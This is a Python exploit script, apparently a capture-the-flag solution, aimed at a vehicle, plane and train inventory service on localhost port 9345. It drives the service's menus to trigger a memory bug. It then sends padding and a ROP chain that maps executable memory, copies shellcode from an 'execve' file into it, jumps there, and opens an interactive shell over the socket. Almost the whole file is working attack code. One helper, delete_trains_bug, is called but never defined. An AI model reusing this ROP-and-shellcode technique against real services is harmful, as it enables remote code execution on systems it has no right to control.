import sys
import socket
import telnetlib
import random
import struct
import time

'''
0x0000000000402438 : pop rax ; ret

0x00000000004351d3 : pop rbx ; ret

0x000000000043658b : pop rcx ; ret

0x000000000053ae16 : pop rdx ; ret

0x00000000004f6e67 : pop rsi ; ret

0x00000000004f4e99 : pop rdi ; ret

0x0000000000584491 : pop r8 ; ret

0x00000000004b193e : mov r9, r8 ; mov rcx, r11 ; mov r8, rbx ; call rax

0x0000000000404046 : pop r12 ; ret

0x00000000004f4e92 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x000000000066ceea : mov qword ptr [rax], rcx ; ret

0x000000000065e753 : xor rax, rax ; ret

0x000000000066ceea : mov qword ptr [rax], rcx ; ret

0x000000000066ce2d : mov qword ptr [rax], rdx ; mov qword ptr [rax + 8], rcx ; ret

.plt:0000000000403770 _syscall        proc near               ; CODE XREF: __gnat_lwp_self+7j
.plt:0000000000403770                 jmp     cs:off_9FC540
.plt:0000000000403770 _syscall        endp
'''

pop_r8 = struct.pack('Q', 0x0000000000584491)
get_r9 = struct.pack('Q', 0x00000000004b193e)
pop_rbx = struct.pack('Q', 0x00000000004351d3)
pop_rcx = struct.pack('Q', 0x000000000043658b)
pop_rdx = struct.pack('Q', 0x000000000053ae16)
pop_rsi = struct.pack('Q', 0x00000000004f6e67)
pop_rdi = struct.pack('Q', 0x00000000004f4e99)
xor_rax = struct.pack('Q', 0x000000000065e753)
pop_rax = struct.pack('Q', 0x0000000000402438)
syscall = struct.pack('Q', 0x0000000000403770)
www = struct.pack('Q', 0x000000000066ce2d)

def ru( s, u):
  z = ''

  while z.endswith(u) == False:
    z += s.recv(1)

  return z

def add_vehicle( s, make, model, cost, mpg, year):
    s.send('1\n')
    print ru(s,  ': ')
    s.send(make + '\n')

    print ru(s,  ': ')
    s.send(model + '\n')

    print ru(s,  ': ')
    s.send(str(year) + '\n')

    print ru(s,  ': ')
    s.send(str(mpg) + '\n')

    print ru(s,  ': ')
    s.send(str(cost) + '\n')

    print ru(s, '> ')

def print_vehicles( s ):
    s.send('2\n')
    print ru(s, '> ')

def delete_vehicle( s ):
    s.send('3\n')
    print ru( s, ': ')
    s.send('y\n')
    print ru(s, 'index: ')
    s.send('2\n')
    print 'Send 2 index'
    print ru( s, '> ')

def update_vehicle( s ):
    s.send('4\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('2\n')
    print ru(s, ': ')
    s.send('y\n')
    print ru(s, ': ')
    s.send("fuckall\n")
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, '> ')

def poll_vehicles ( ):  
    s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 9345))

    s.send('get /vehicles http/1.1\r\n\r\n')

    print ru( s, '> ')

    add_vehicle( s, "subuaru", "outback", 23000.3, 23.4, 2014)
    add_vehicle( s, "toyota", "carolla", 23030.5, 50.6, 1014)
    add_vehicle( s, "yodog", "books", 23000.00, 23.4, 2014)

    print_vehicles(s)

    delete_vehicle(s)
    print_vehicles(s)
    update_vehicle(s)
    print_vehicles(s)


    data = '5\n'

    data += 'a'*256
    data += 'c'*32
    data += 'f'*16
    data += 'g'*6
    data += pop_r8
    data += struct.pack("Q", 0xffffffff)        # will become r9
    data += pop_rbx
    data += struct.pack("Q", 0x22)      ## will become r8
    data += pop_rax
    data += pop_rcx
    data += get_r9      # this calls rax so an additional pop is needed
    data += pop_rcx
    data += struct.pack("Q", 7)
    data += pop_rdx
    data += struct.pack("Q", 0x1000)
    data += pop_rsi
    data += struct.pack("Q", 0x41410000)
    data += pop_rdi
    data += struct.pack("Q", 9)
    data += xor_rax
    data += syscall

    base = 0x41410000

    f = open('execve', 'rb')
    sc = f.read()
    f.close()

    sc = '\x90' * (16-(len(sc)%16)) + sc

    while len(sc) > 0:
        data += pop_rax
        data += struct.pack('Q', base)
        data += pop_rdx
        data += sc[:8]
        sc = sc[8:]
        data += pop_rcx
        data += sc[:8]
        sc = sc[8:]
        data += www
        base += 16

    data += struct.pack("Q", 0x41410000)

    s.send(data)
    time.sleep(1)
    s.send('aaaaid\n')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    #print ru(s, '/html>')

def add_plane( s, manu, t, cost, mph, passengers):
    s.send('1\n')
    print ru(s,  ': ')
    s.send(manu + '\n')

    print ru(s,  ': ')
    s.send(str(passengers) + '\n')

    print ru(s,  ': ')
    s.send(t + '\n')

    print ru(s,  ': ')
    s.send(str(cost) + '\n')

    print ru(s,  ': ')
    s.send(str(mph) + '\n')



    print ru(s, '> ')

def print_planes( s ):
    s.send('2\n')
    print ru(s, '> ')

def delete_plane( s ):
    s.send('3\n')
    print ru( s, ': ')
    s.send('y\n')
    print ru(s, 'index: ')
    s.send('2\n')
    print ru( s, '> ')

def delete_plane_bug( s ):
    s.send('3\n')
    print ru( s, ': ')
    s.send('y\n')
    print ru(s, 'index: ')

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    print ru( s, '> ')

def update_plane( s ):
    s.send('4\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('2\n')
    print ru(s, ': ')
    s.send('y\n')
    print ru(s, ': ')
    s.send("fuckall\n")
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, ': ')
    s.send('n\n')
    print ru(s, '> ')

def poll_planes ( ):  
    s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 9345))

    s.send('get /planes http/1.1\r\n\r\n')

    print ru( s, '> ')
    add_plane( s, "boeing", "747", 230000.3, 23.4, 200)
    add_plane( s, "raytheon", "carolla", 23030.5, 50.6, 1014)
    add_plane( s, "eatit", "sucker", 23000.00, 23.4, 300)

    print_planes(s)

    delete_plane_bug(s)
    print_planes(s)
    update_plane(s)
    print_planes(s)

    s.send('5\n')

    print ru(s, '/html>')

def add_train( s, name, model, t, speed, passengers):
    s.send('1\n')
    print ru(s,  ': ')
    s.send(name + '\n')

    print ru(s,  ': ')
    s.send(model + '\n')

    print ru(s,  ': ')
    s.send(t + '\n')

    print ru(s,  ': ')
    s.send(str(speed) + '\n')

    print ru(s,  ': ')
    s.send(str(passengers) + '\n')

    print ru(s, '\n: ')

def print_trains( s ):
    s.send('2\n')
    print ru(s, '\n: ')

def delete_trains( s ):
    s.send('3\n')
    print ru( s, ': ')
    s.send('y\n')
    print ru(s, 'index: ')
    s.send('2\n')
    print ru( s, '\n: ')

def update_train( s ):
    s.send('4\n')
    print ru(s, ': ')
    s.send('y\n')
    print ru(s, 'index: ')
    s.send('2\n')
    print ru(s, ': ')
    s.send('y\n')
    print ru(s, ': ')
    s.send("fuckall\n")
    print ru(s, '\n: ')

def poll_trains ():
    s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 9345))

    s.send('get /trains http/1.1\r\n\r\n')

    print ru( s, '\n: ')
    add_train( s, "boeing", "747", "fuck", 23.4, 200)
    add_train( s, "raytheon", "carolla", "ass", 50.6, 1014)
    add_train( s, "eatit", "sucker", "shit", 23.4, 300)


    delete_trains_bug(s)

    s.send('5\n')
    print ru(s, '/html>')

    s.close()
    
def main( ):
    poll_vehicles()

if __name__ == '__main__':
    main()